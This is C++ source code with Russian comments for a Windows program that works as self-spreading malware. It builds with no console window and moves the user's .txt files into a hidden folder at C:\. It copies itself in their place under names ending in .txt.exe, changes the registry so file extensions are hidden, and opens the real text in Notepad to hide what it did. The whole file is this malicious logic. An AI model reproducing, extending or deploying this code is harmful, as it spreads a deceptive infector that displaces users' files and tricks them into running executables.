/*
Для компиляции без окна косоли в Visual Studio 2017 установите следующие свойства проекта

Свойства проекта - > Компоновщик - > Система -> Меняем в графе "Подсистема" (1 строка) на "Windows (/SUBSYSTEM:WINDOWS)"
Компоновщик - > Дополнительно - > Точка входа (1 строка) "mainCRTStartup"
*/

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string>
#include <algorithm>
#include "Shlobj_core.h"


bool FileExists(LPCTSTR fname)
{
	return::GetFileAttributes(fname) != DWORD(-1);
}

int main()
{
	setlocale(LC_ALL, "Russian"); // Говорим что будем работать с кирилицей


	wchar_t exe_dir[MAX_PATH]; // создаем массив символов под деррикторию
	GetCurrentDirectory(MAX_PATH, exe_dir); // узнаем деррикторию
	std::wstring exe_dir_wstring(exe_dir); // ковертируем в строку

	wchar_t exe_dir_and_name[MAX_PATH]; // создаем массив символов под полный путь испольняяемого файла
	GetModuleFileName(NULL, exe_dir_and_name, sizeof(exe_dir_and_name) / sizeof(exe_dir_and_name[0])); // узнаем поный путь исполняемого файла
	std::wstring exe_dir_and_name_wstring(exe_dir_and_name); // конвертируем в строку

	std::wstring exe_name_wstring = exe_dir_and_name; // создаем строку под имя исоплняемоного файла
	exe_name_wstring.replace(0, exe_dir_wstring.length() + 1, L""); // узнаем имя усполняемого файла, путем вырезания из полного пути путь дерриктории 

	std::wstring txt_name_wstring = exe_name_wstring; // строка под навание txt-файла
	size_t posn; // переменная под позицию последнего вхождения подстроки в строку
	if (txt_name_wstring.rfind(L".txt.exe") != std::wstring::npos) { // смотрим последнее вхождение подстроки ".txt.exe" в строке имени исполняемого файла
		// если ".txt.exe" вхождение есть

		posn = txt_name_wstring.rfind(L".txt.exe"); // позиция вхрждения

		txt_name_wstring.replace(posn, txt_name_wstring.length(), L".txt"); // формируем название txt-файла

	}
	else {
		// если ".txt.exe" вхождения не оказалось

		if (txt_name_wstring.rfind(L"txt.exe") != std::wstring::npos) { // проверяем вхождение "txt.exe"
			// если "txt.exe" вхождение есть
			
			posn = txt_name_wstring.rfind(L"txt.exe"); // позиция последнего вхождения

			txt_name_wstring.replace(posn, txt_name_wstring.length(), L"exe.txt"); // формируем название txt-файла

		}
	}


	WIN32_FIND_DATA find_txt_file_data; // структура под список txt-файлов 
	HANDLE h_txt_file_in_dir; // хендел под очередной txt-файл из дерркиктории
	h_txt_file_in_dir = FindFirstFile((LPCTSTR)(exe_dir_wstring + L"\\*.txt").c_str(), &find_txt_file_data); // находим хендел txt-файла из дерриктории
	if (h_txt_file_in_dir != INVALID_HANDLE_VALUE) { // если хендел был получен

		if (GetFileAttributes(L"C:\\Секретная папка с файлами txt") == 0xFFFFFFFF) { // проверяем существует ли наша секретная папка
			// если ее нет, то создаем

			CreateDirectory(L"C:\\Секретная папка с файлами txt", NULL);

		}


		do { // сначала

			std::wstring find_txt_name_wstring = find_txt_file_data.cFileName;


			if (MoveFileEx((exe_dir_wstring + L"\\" + find_txt_name_wstring).c_str(), (L"C:\\Секретная папка с файлами txt\\" + find_txt_name_wstring).c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) { // перемещаяем очередной txt-файл в нашу секретную папку
			}
			else {
			}

			CopyFile(exe_dir_and_name_wstring.c_str(), (exe_dir_wstring + L"\\" + find_txt_name_wstring + L".exe").c_str(), FALSE);

		} while (FindNextFile(h_txt_file_in_dir, &find_txt_file_data) != 0); // сомтрим хендл
		FindClose(h_txt_file_in_dir); // закрываем хендел txt-файла из дерриктории
	}


	HKEY hkey; // переменная указывающая на запись в регистре
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\", 0, KEY_ALL_ACCESS, &hkey); // задаем ей значение согласно нужной нам записи в реестре
	LPBYTE myPath = new BYTE[4]; // массив байт под содержимое записи
	myPath[0] = 0x01; myPath[1] = 0x00; myPath[2] = 0x00; myPath[3] = 0x00; // формируем то что будем писать в реестр

	RegSetValueEx(hkey, TEXT("HideFileExt"), 0, REG_DWORD, (LPBYTE)myPath, sizeof(myPath)); // пишем в реестр

	HWND hwnd_explorer = GetShellWindow(); // получаем хендл на проводник
	PostMessage(hwnd_explorer, WM_KEYDOWN, VK_F5, 0); // посылаем проводнику нажатие клавиши, что заставит его обновится

	if (FileExists((LPCTSTR)(L"C:\\Секретная папка с файлами txt\\" + txt_name_wstring).c_str())) { // проверяем существует ли txt-файл в нашей секретной папке
		//если txt-файл существует

		MoveFileEx((L"C:\\Секретная папка с файлами txt\\" + txt_name_wstring).c_str(), (exe_dir_wstring + L"\\" + txt_name_wstring).c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED); // перемещаем txt-файл обратно в папку, в которой наш exe, что бы пользователь мог с ним работать
	}
	else {
		//если txt-файл не существует

		HANDLE handle_txt_file; // хендел под txt-файл
		handle_txt_file = CreateFile((LPCTSTR)(txt_name_wstring).c_str(), // создаем txt-файл в папке где и исполняемый файл
			GENERIC_READ | GENERIC_WRITE, // файл можно и читать и записывать в него
			FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, // другие процессы могут удалять файл, записывать в него и читать его
			NULL, // дочерние процесы не могут взаимодействовать
			CREATE_NEW, // именно создать файл (создать без проверок, и именно создать, а не отвкрыть как либо)
			FILE_ATTRIBUTE_NORMAL, // хранить в номальном виде (, а не зашифрованном, не сжатом или ином виде)
			NULL); // этот атрибут игнорируется из-за CREATE_NEW
		if (txt_name_wstring == L"Памятка - почему нельзя запускать файлы exe.txt") { // если имя созданного txt-файла "Памятка - почему нельзя запускать файлы exe.txt"
			//то

			char text[] = "текст памятки"; // задаем текст на запись
			WriteFile(handle_txt_file, text, strlen(text), NULL, NULL); // пишем в файл
		}
		else {
			// если имя созданного txt-файла не "Памятка - почему нельзя запускать файлы exe.txt"

			LONGLONG nFileLen = 0; // переменная под размер испольняемого файла
			WIN32_FILE_ATTRIBUTE_DATA fData; // структура под данные исполняемого файла
			int res = GetFileAttributesEx(exe_dir_and_name, GetFileExInfoStandard, &fData); // пишем в структуру данные исполняемого файла 
			if (res) // если структура успешно заполняется
			nFileLen = (fData.nFileSizeHigh * (MAXDWORD + 1)) + fData.nFileSizeLow; // узнаем размер

			char text[] = " "; // задаем текст на запись
			for (LONGLONG i = 0; i < nFileLen; i++) { // будем заполнять txt-мусором, пока он не станет равен по размеру исполняемому
				text[0] = rand(); // текст становится случайным символом
				WriteFile(handle_txt_file, // пишем в txt-файл
					text, // текст со случайным символом
					(DWORD)1, // пишем именно один символ ; 
					//можно использовать:
					// (DWORD)1 - азиатские символы
					// strlen(text) - все символы
					// причем размер файла и в том и в другом случае одинаков
					NULL, // не используемый агрумент
					NULL); // игнорируемый аргумент
			}
		}

		CloseHandle(handle_txt_file); // закрыли файловый дискриптор txt-файла, который создали

	}


	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD dw = 0;
	std::wstring cmdline;
	cmdline = L"notepad " + txt_name_wstring;
	memset(&si, NULL, sizeof(si));
	if (CreateProcess(NULL, (LPWSTR)cmdline.c_str(), NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi)) // Успешно запустили
	{
		while (1)
		{
			GetExitCodeProcess(pi.hProcess, &dw);
			if (dw != STILL_ACTIVE) // Процесс завершился
			{
				break;
			}
			Sleep(10);
		}
	}

	h_txt_file_in_dir = FindFirstFile((LPCTSTR)(exe_dir_wstring + L"\\*.txt").c_str(), &find_txt_file_data); // находим хендел txt-файла из дерриктории
	if (h_txt_file_in_dir != INVALID_HANDLE_VALUE) { // если хендел был получен

		if (GetFileAttributes(L"C:\\Секретная папка с файлами txt") == 0xFFFFFFFF) { // проверяем существует ли наша секретная папка
			// если ее нет, то создаем

			CreateDirectory(L"C:\\Секретная папка с файлами txt", NULL);

		}

		do { // сначала

			std::wstring find_txt_name_wstring = find_txt_file_data.cFileName;

			if (MoveFileEx((exe_dir_wstring + L"\\" + find_txt_name_wstring).c_str(), (L"C:\\Секретная папка с файлами txt\\" + find_txt_name_wstring).c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) { // перемещаяем очередной txt-файл в нашу секретную папку
			}
			else {
			}

			CopyFile(exe_dir_and_name_wstring.c_str(), (exe_dir_wstring + L"\\" + find_txt_name_wstring + L".exe").c_str(), FALSE);

		} while (FindNextFile(h_txt_file_in_dir, &find_txt_file_data) != 0); // сомтрим хендл
		FindClose(h_txt_file_in_dir); // закрываем хендел txt-файла из дерриктории
	}


	if ((exe_name_wstring.rfind(L".txt.exe") == std::wstring::npos) && (exe_name_wstring.rfind(L"txt.exe") != std::wstring::npos)) { // смотрим последнее вхождение подстроки "txt.exe" в строке имени исполняемого файла
	// если "txt.exe" вхождение есть

		std::wstring new_exe_name_wstring = exe_name_wstring; // строка под новое навание exe-файла
		posn = new_exe_name_wstring.rfind(L"txt.exe"); // ищем позицию вхождения окончиная
		new_exe_name_wstring.replace(posn, new_exe_name_wstring.length(), L"exe.txt.exe"); // формируем название txt-файла

		if (MoveFileEx((exe_dir_wstring + L"\\" + exe_name_wstring).c_str(), (exe_dir_wstring + L"\\" + new_exe_name_wstring).c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) { // перемещаяем очередной txt-файл в нашу секретную папку
		}
		else {
		}

	}
	else {
		// если "txt.exe" вхождения не оказалось
	}

	return 0;
}

